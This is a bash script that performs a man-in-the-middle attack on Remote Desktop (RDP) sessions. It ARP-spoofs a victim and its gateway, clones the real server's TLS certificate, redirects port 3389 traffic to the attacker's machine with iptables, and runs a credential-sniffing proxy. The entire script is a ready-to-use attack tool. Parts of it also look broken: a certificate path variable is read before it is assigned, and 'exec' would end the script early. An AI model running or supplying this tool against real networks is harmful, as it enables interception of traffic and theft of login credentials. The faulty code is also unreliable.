#!/bin/bash

set -e

if [ "$#" -ne 4 ]; then
    cat << EOF
Usage:
$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP>
EOF
    exit 1
fi

IFACE="$1"
ATTACKER_IP="$2"
VICTIM_IP="$3"
GATEWAY_IP="$4"

IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

IPTABLES_PARAMETERS="PREROUTING -p tcp -s $VICTIM_IP --dport 3389 -j DNAT --to-destination $ATTACKER_IP:3389"

function finish {
    echo "[*] Cleaning up..."
    exec iptables -t nat -D $IPTABLES_PARAMETERS
    printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
    kill $ARP_PID_1 $ARP_PID_2
    kill -- -$$
    echo "[*] Done."
}
trap finish EXIT

echo "[*] Turning off IP forwarding..."

echo 0 > /proc/sys/net/ipv4/ip_forward

echo "[*] Spoofing arp replies..."

arpspoof -i "$IFACE" -t "$VICTIM_IP" "$GATEWAY_IP" 2>/dev/null 1>&2 && ARP_PID_1=$! &
arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$VICTIM_IP" 2>/dev/null 1>&2 && ARP_PID_2=$! &

echo "[*] Waiting for a SYN packet to the original destination..."

ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
    src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
    | sed -e  's/.*> \([0-9.]*\)\.3389:.*/\1/')"

echo "[+] Got it! Original destination is $ORIGINAL_DEST"

echo "[*] Clone the x509 certificate of the original destination..."

CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389")"
KEYPATH="$(printf "%s" "$CERTPATH" | head -n1)"
CERTPATH="$(printf "%s" "$CERTPATH" | tail -n1)"

echo "[*] Set iptables rules..."

exec iptables -t nat -A $IPTABLES_PARAMETERS
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Run RDP proxy..."

$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" -g 1 "$ORIGINAL_DEST"
